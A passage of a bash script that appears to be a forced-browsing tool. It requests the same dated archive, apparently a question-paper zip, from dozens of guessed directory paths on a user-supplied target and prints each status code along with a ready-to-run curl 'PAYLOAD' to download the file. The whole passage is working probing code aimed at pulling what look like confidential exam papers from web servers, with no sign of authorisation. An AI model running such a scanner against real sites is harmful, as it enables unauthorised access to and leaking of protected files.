${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderManagement/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUploadQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUploadQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUploadQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperAutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUploadQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUploadQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUploadQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerAutomation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
